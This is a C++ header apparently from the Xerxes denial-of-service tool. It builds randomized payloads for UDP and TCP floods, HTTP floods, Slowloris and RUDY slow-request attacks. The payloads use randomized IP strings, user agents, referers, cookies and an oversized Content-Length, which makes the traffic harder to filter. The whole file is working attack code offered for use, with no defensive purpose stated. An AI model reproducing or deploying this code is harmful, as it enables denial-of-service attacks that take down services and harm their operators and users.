#ifndef XERXES_RANDOMIZER_H
#define XERXES_RANDOMIZER_H

#include <string>
#include <random>
#include <chrono>

#include "Configuration.hpp"

namespace Randomizer{

    static int randomInt(int min, int max){
        unsigned seed = static_cast<unsigned int>(std::chrono::steady_clock::now().time_since_epoch().count());
        std::default_random_engine engine(seed);
        std::uniform_int_distribution<int> distribution(min, max);
        return distribution(engine);
    }

    static const std::string randomIP(){
        std::string src{std::to_string(randomInt(1, 256))};
        src += "."
               + std::to_string(randomInt(1, 256))
               + "."
               + std::to_string(randomInt(1, 256))
               + "."
               + std::to_string(randomInt(1, 256));
        return src;
    }

    static int randomPort(){
        return randomInt(0, 65535);
    }

    static const std::string randomstr(){
        int string_length =  randomInt(0, 20);
        std::string string{};
        for(int i = 0; i < string_length; i++){
            string += (static_cast<char>('0' + randomInt(0, 72)));
        }
        return string;
    }

    static const std::string randomize_Vector(const std::vector<std::string> &vec){
        return vec[randomInt(0, static_cast<int>(vec.size()) -1)];
    }

    static const std::string randomPacket(const Config *conf, bool keep_alive=false){
        std::string packet{};
        std::vector<std::string> encoding{"\'\'", "*", "identity", "gzip", "deflate"};
        std::vector<std::string> caching{"no-cache", "max-age=0"};
        std::vector<std::string> charset{"ISO-8859-1", "utf-8", "Windows-1251", "ISO-8859-2", "ISO-8859-15"};
        std::vector<std::string> contenttype{"multipart/form-data", "application/x-url-encoded"};
        std::vector<std::string> methods{"GET", "HEAD"};
        std::vector<std::string> referer{"https://www.google.com/", "https://www.yahoo.com/", "https://www.bing.com/",
                                         "https://twitter.com/", "https://www.facebook.com/", "https://www.msn.com/",
                                         "https://www.youtube.com/", "https://yandex.com/", "https://www.amazon.com/"};
        switch(conf->vector){
            case Config::UDPFlood:
            case Config::TCPFlood:
                return randomstr();
            case Config::HTTP:{
                packet += randomize_Vector(methods) + " /";
                if(conf->RandomizeHeader){
                    packet += randomstr();
                }
                packet += " HTTP/1.0\r\nUser-Agent: "
                          + (conf->RandomizeUserAgent ? randomize_Vector(conf->useragents): conf->useragents[0])
                          +" \r\nCache-Control: " + randomize_Vector(caching)
                          + " \r\nAccept-Encoding: " + randomize_Vector(encoding)
                          + " \r\nAccept-Charset: " + randomize_Vector(charset) + ", " + randomize_Vector(charset)
                          + " \r\nReferer: " + randomize_Vector(referer)
                          + " \r\nAccept: */*\r\nConnection: Keep-Alive"
                          + " \r\nContent-Type: " + randomize_Vector(contenttype)
                          + " \r\nCookie: " + randomstr() + "=" + randomstr()
                          + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
                          + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                          + "\r\n\r\n";
                return packet;
            }
            case Config::Slowloris:{
                if(keep_alive){
                    packet += "X-a: "
                              + std::to_string(randomInt(1, 5000))
                              + " \r\n";
                }else{
                    packet += randomize_Vector(methods) + " /";
                    if(conf->RandomizeHeader){
                        packet += randomstr();
                    }
                    packet += " HTTP/1.0\r\nUser-Agent: "
                              + (conf->RandomizeUserAgent ? randomize_Vector(conf->useragents): conf->useragents[0])
                              + " \r\nCache-Control: " + randomize_Vector(caching)
                              + " \r\nAccept-Encoding: " + randomize_Vector(encoding)
                              + " \r\nAccept-Charset: " + randomize_Vector(charset) + ", " + randomize_Vector(charset)
                              + " \r\nReferer: " + randomize_Vector(referer)
                              + " \r\nContent-Type: " + randomize_Vector(contenttype)
                              + " \r\nCookie: " + randomstr() + "=" + randomstr()
                              + " \r\nAccept: */*"
                              + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                              + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                              + " \r\n";
                }
                return packet;
            }
            case Config::Rudy:{
                if(keep_alive){
                    packet += randomstr();
                }else{
                    packet += "POST /";
                    if(conf->RandomizeHeader){
                        packet += randomstr();
                    }
                    packet += " HTTP/1.0\r\nUser-Agent: "
                              + (conf->RandomizeUserAgent ? randomize_Vector(conf->useragents): conf->useragents[0])
                              + " \r\nCache-Control: " + randomize_Vector(caching)
                              + " \r\nAccept-Encoding: " + randomize_Vector(encoding)
                              + " \r\nAccept-Charset: " + randomize_Vector(charset) + ", " + randomize_Vector(charset)
                              + " \r\nReferer: " + randomize_Vector(referer)
                              + " \r\nContent-Type: " + randomize_Vector(contenttype)
                              + " \r\nContent-Length: " + std::to_string(randomInt(100000000, 1000000000))
                              + " \r\nCookie: " + randomstr() + "=" + randomstr()
                              + " \r\nAccept: */*"
                              + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                              + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                              + " \r\n";
                }
                return packet;
            }
            default:
                return "";
        }
    }
}

#endif //XERXES_RANDOMIZER_H
